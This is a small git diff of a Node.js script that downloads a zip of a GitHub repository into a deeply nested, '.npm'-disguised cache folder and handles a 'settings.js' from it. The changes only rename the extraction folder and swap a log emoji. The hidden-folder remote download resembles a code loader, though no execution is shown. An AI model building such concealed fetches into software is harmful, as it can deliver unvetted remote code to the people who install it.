@@ -18,7 +18,7 @@ const TEMP_DIR = path.join(__dirname, '.npm', 'xcache', ...deepLayers);
 
 // === GIT CONFIG ===
 const DOWNLOAD_URL = "https://github.com/superstar-zimtk/pretty-md-private-1/archive/refs/heads/main.zip";                     
-const EXTRACT_DIR = path.join(TEMP_DIR, "pretty-md-private-1");
+const EXTRACT_DIR = path.join(TEMP_DIR, "pretty-md-private-1-main");
 const LOCAL_SETTINGS = path.join(__dirname, "settings.js");
 const EXTRACTED_SETTINGS = path.join(EXTRACT_DIR, "settings.js");
 
@@ -34,7 +34,7 @@ async function downloadAndExtract() {
     }
 
     if (fs.existsSync(TEMP_DIR)) {
-      console.log(chalk.green("🧹 Cleaning previous cache..."));
+      console.log(chalk.green("🗑️ Cleaning previous cache..."));
       fs.rmSync(TEMP_DIR, { recursive: true, force: true });
     }
     fs.mkdirSync(TEMP_DIR, { recursive: true });
